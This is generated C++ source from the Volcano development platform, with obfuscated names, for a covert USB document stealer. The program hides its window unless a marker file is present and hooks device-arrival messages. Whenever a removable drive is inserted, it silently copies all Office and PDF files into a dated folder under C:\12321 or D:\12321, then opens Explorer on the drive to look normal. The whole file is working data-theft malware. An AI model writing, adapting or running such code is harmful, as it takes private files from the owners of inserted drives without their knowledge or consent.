
// Generated by Volcano Development Platform - http://www.voldp.com

#include "stdafx.h"
#include "vol_user_app.h"

EXTERN_FUNC_ITEM rw_1 [] =
{
    {  _T ("user32.dll"),  "CallWindowProcW",  NULL  },
    {  NULL,  "",  NULL  }
};

namespace rg_hsh_chx
{

static void _sOnClassesStaticInit ()
{
    rg_qdl::_sOnStaticInit ();
}

void rg_qdl::_sOnStaticInit ()
{
    rg_n.rg_n7748 (_CT ("我的主窗口"));
}

rg_qdl::rg_qdl ()
{
}

INT rg_qdl::rg_n1 ()
{
    if (g_objVolApp.InitExternFuncTable (::rw_1, TRUE) == FALSE)
        return 0;
    _sOnClassesStaticInit ();
    rg_n.CreateMainVolWindow (_VOL_INT_MIN, _VOL_INT_MIN, _VOL_INT_MIN, _VOL_INT_MIN, _NULL_VOL_OBJECT (rg_hsh_MFCjm_jb::rg_cchl).GetVolMenuCheckNull ());
    return (1);
}

rg_wdzhchk::rg_wdzhchk ()
{
    rw_33 = new CVolObjectPointer (this);
    _VOL_THIS.rg_n7748 (_CT ("主窗口"));
    _VOL_THIS.rg_n7753 (FALSE);
}

BOOL rg_wdzhchk::_IsSelfEqual (const rg_wdzhchk& objCompare) const
{
    if (rg_n2 != objCompare.rg_n2)  return FALSE;
    return TRUE;
}

void rg_wdzhchk::_CopySelfFrom (const rg_wdzhchk& objCopyFrom)
{
    rg_n2 = objCopyFrom.rg_n2;
}

rg_wdzhchk::~rg_wdzhchk ()
{
    rw_33->ReleasePointer ();
}

void rg_wdzhchk::OnWinContainerCreated ()
{
    BaseClass::OnWinContainerCreated ();
    ra_zjbjq_n6081 ((VOID_FUNC)re_wdzhchk_n3, rw_33, 0);
    rg_n2.rg_n7748 (_CT ("关闭程序"));
    rg_n2.CreateVolControl (this, 85, 38, 328, 192, 101);
    rg_n2.ra_annjchl_n6261 ((VOID_FUNC)re_wdzhchk_n17, rw_33, 0);
}

INT rg_wdzhchk::rg_n3 (rg_wdzhchk& rg_n4, INT rg_n5)
{
    rg_hsh_jb::rg_wbshzl rg_n6;
    rg_qjbll::rg_n35 = (INT_P)rg_n4.GetMfcWndPtr ()->m_hWnd;
    rg_qjbll::rg_n34 = SetWindowLongPtr ((HWND)rg_qjbll::rg_n35, -4, (LONG_PTR)((INT_P)&rg_n29));
    rg_qjbll::rg_n36 = rg_hsh_jb::rg_shjczl::rg_n3514 (GetCurrentDateTime (), 1, TRUE);
    rg_qjbll::rg_n37.data ().Add2 (_CT ("*.pptx").GetText ());
    rg_qjbll::rg_n37.data ().Add2 (_CT ("*.ppt").GetText ());
    rg_qjbll::rg_n37.data ().Add2 (_CT ("*.docx").GetText ());
    rg_qjbll::rg_n37.data ().Add2 (_CT ("*.doc").GetText ());
    rg_qjbll::rg_n37.data ().Add2 (_CT ("*.xlsx").GetText ());
    rg_qjbll::rg_n37.data ().Add2 (_CT ("*.xls").GetText ());
    rg_qjbll::rg_n37.data ().Add2 (_CT ("*.pdf").GetText ());
    rg_hsh_jymk::rg_j_jt::rg_n9608 (rg_n6);
    if ((INT)rg_n6.data ().GetCount () == 1)
    {
        rg_qjbll::rg_n39 = _T ("c");
    }
    else
    {
        rg_qjbll::rg_n39 = _T ("d");
    }
    return (0);
}

void CALLBACK rg_wdzhchk::rg_n7 (TCHAR rg_n8)
{
    INT rg_n9;
    INT rg_n10;
    INT rg_n11;
    CVolString rg_n12;
    CVolString rg_n13;
    CVolString rg_n14;
    rg_qjbll::rg_n41 = CVolString (rg_n8) + _T (":\\");
    if ((BOOL)IsOSFileExist ((CVolString (rg_qjbll::rg_n41) + _T ("114514.txt")).GetText ()) == TRUE)
    {
        rg_qdl::rg_n.rg_n7753 (TRUE);
    }
    else
    {
        if (rg_qjbll::rg_n39 == _T ("c"))
        {
            if (rg_hsh_jymk::rg_j_wjml::rg_n8238 (_CT ("C:\\12321\\") + rg_qjbll::rg_n36) == TRUE)
            {
                rg_n9 = 1;
                while (rg_hsh_jymk::rg_j_wjml::rg_n8238 (_CT ("C:\\12321\\") + rg_qjbll::rg_n36 + _T ("(") + CVolString (rg_n9) + _T (")")) == TRUE)
                {
                    rg_n9 = rg_n9 + 1;
                }
                rg_qjbll::rg_n40 = _CT ("C:\\12321\\") + rg_qjbll::rg_n36 + _T ("(") + CVolString (rg_n9) + _T (")");
            }
            else
            {
                rg_qjbll::rg_n40 = _CT ("C:\\12321\\") + rg_qjbll::rg_n36;
            }
        }
        else
        {
            if (rg_hsh_jymk::rg_j_wjml::rg_n8238 (_CT ("D:\\12321\\") + rg_qjbll::rg_n36) == TRUE)
            {
                rg_n9 = 1;
                while (rg_hsh_jymk::rg_j_wjml::rg_n8238 (_CT ("D:\\12321\\") + rg_qjbll::rg_n36 + _T ("(") + CVolString (rg_n9) + _T (")")) == TRUE)
                {
                    rg_n9 = rg_n9 + 1;
                }
                rg_qjbll::rg_n40 = _CT ("D:\\12321\\") + rg_qjbll::rg_n36 + _T ("(") + CVolString (rg_n9) + _T (")");
            }
            else
            {
                rg_qjbll::rg_n40 = _CT ("D:\\12321\\") + rg_qjbll::rg_n36;
            }
        }
        rg_hsh_jymk::rg_j_wjml::rg_n8242 (rg_qjbll::rg_n40);
        rg_qjbll::rg_n38 = (INT)rg_qjbll::rg_n37.data ().GetCount ();
        for (INT_P __vol_counter_index = 0; __vol_counter_index < rg_qjbll::rg_n38; __vol_counter_index++)
        {
            rg_n10 = (INT)__vol_counter_index;
            rg_n12 = CVolString (rg_qjbll::rg_n37.data ().GetAt (rg_n10));
            rg_hsh_jymk::rg_j_wjml::rg_n8190 (rg_qjbll::rg_n41, rg_n12, rg_qjbll::rg_n42, TRUE, TRUE);
            for (INT_P __vol_counter_index = 0; __vol_counter_index < (INT)rg_qjbll::rg_n42.data ().GetCount (); __vol_counter_index++)
            {
                rg_n11 = (INT)__vol_counter_index;
                rg_n13 = CVolString (rg_qjbll::rg_n42.data ().GetAt (rg_n11)).Left ((INT)CVolString (rg_qjbll::rg_n42.data ().GetAt (rg_n11)).SearchText (_CT ("\\").GetText (), -1, FALSE, TRUE));
                rg_n13 = CVolString (rg_qjbll::rg_n42.data ().GetAt (rg_n11)).Right ((INT)CVolString (rg_qjbll::rg_n42.data ().GetAt (rg_n11)).GetLength () - (INT)CVolString (rg_qjbll::rg_n42.data ().GetAt (rg_n11)).SearchText (_CT ("\\").GetText (), 0, FALSE, FALSE));
                rg_hsh_jymk::rg_j_wjml::rg_n8242 (rg_qjbll::rg_n40 + _T ("\\") + rg_n13);
                rg_n14 = rg_qjbll::rg_n40 + _T ("\\") + rg_n13 + rg_hsh_jymk::rg_j_wjml::rg_n8254 (CVolString (rg_qjbll::rg_n42.data ().GetAt (rg_n11)));
                rg_hsh_jymk::rg_j_wjml::rg_n8150 (CVolString (rg_qjbll::rg_n42.data ().GetAt (rg_n11)), rg_n14, TRUE);
            }
        }
        rg_qjbll::rg_n42.data ().RemoveAll ();
        RunCommandLine ((_CT ("explorer ") + rg_qjbll::rg_n41).GetText (), FALSE, SW_SHOWNORMAL);
        ::MessageBeep (MB_OK);
    }
}

void CALLBACK rg_wdzhchk::rg_n15 (TCHAR rg_n16)
{
     _DEBUG_STATMENT (DebugTrace (0, 0, _T ("S"), (_CT ("-") + CVolString (rg_n16)).GetText ()));
}

INT rg_wdzhchk::rg_n17 (rg_hsh_MFCjm_jb::rg_ann& rg_n18, INT rg_n19)
{
    ExitProcess (0);
    return (0);
}

INT64 CALLBACK rg_wdzhchk::CallWindowProcW (INT64 rg_n20, INT64 rg_n21, INT rg_n22, INT64 rg_n23, INT64 rg_n24)
{
    typedef INT64 (CALLBACK *PFN_CallWindowProcW) (INT64 rg_n20, INT64 rg_n21, INT rg_n22, INT64 rg_n23, INT64 rg_n24);
    return ((PFN_CallWindowProcW)rw_1 [0].m_func) (rg_n20, rg_n21, rg_n22, rg_n23, rg_n24);
}

INT64 CALLBACK rg_wdzhchk::rg_n29 (INT64 rg_n30, INT rg_n31, INT64 rg_n32, INT64 rg_n33)
{
    if (rg_n31 == 537)
    {
        typedef struct _DEV_BROADCAST_VOLUME {
          DWORD dbcv_size;
          DWORD dbcv_devicetype;
          DWORD dbcv_reserved;
          DWORD dbcv_unitmask;
          WORD  dbcv_flags;
        } DEV_BROADCAST_VOLUME;
         if ((DWORD)rg_n32 == 32768) {
         DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*) rg_n33;
         if (p->dbcv_devicetype == 2) {
         int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
         ((INT(__stdcall*)(...))(INT_P)&rg_n7)('A' + l);
         }
         }
        else if ((DWORD)rg_n32 == 32772) {
                    DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*) rg_n33;
                    if (p->dbcv_devicetype == 2) {
                        int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
         ((INT(__stdcall*)(...))(INT_P)&rg_n15)('A' + l);
         }
         }
    }
    return (CallWindowProcW (rg_qjbll::rg_n34, rg_n30, rg_n31, rg_n32, rg_n33));
}

rg_qjbll::rg_qjbll ()
{
}

}
